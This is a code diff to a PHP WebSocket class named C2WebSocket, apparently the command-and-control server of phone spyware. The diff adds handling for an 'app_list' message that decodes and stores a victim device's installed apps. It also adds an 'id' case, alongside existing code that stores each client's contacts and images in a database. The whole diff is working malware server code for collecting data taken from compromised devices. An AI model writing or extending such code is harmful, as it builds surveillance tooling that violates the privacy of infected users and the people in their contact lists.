@@ -54,6 +54,9 @@ class C2WebSocket implements MessageComponentInterface {
         elseif ($data->type === 'server')
             $this->serverConnection($conn, $data);
 
+        if (isset($data->res) && $data->res === 'id')
+            return;
+
         if (isset($this->server)) {
             $currentDateTime = date('Y-m-d H:i:s');
             $response = [
@@ -94,11 +97,21 @@ class C2WebSocket implements MessageComponentInterface {
         $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
 
         switch ($data->res) {
+            case "app_list":
+                $apps = json_decode(base64_decode($data->data));
+                foreach ($apps as $packageName => $appName) {
+                    $query = "INSERT INTO INSTALLED_APP(client_id, package_name, app_name, timestamp) VALUES(?, ?, ?, ?)";
+                    $this->database->insert($query, [$clientID, $packageName, $appName, $data->timestamp]);
+                }
+                break;
             case "contact":
                 $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                 $name = base64_decode($data->name);
                 $number = base64_decode($data->number);
                 $this->database->insert($query, [$clientID, $name, $number]);
+                break;
+            case "id":
+                $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId);
                 break;
             case "image":
                 $query = "INSERT INTO IMAGE(client_id, filename, timestamp) VALUES(?, ?, ?)";
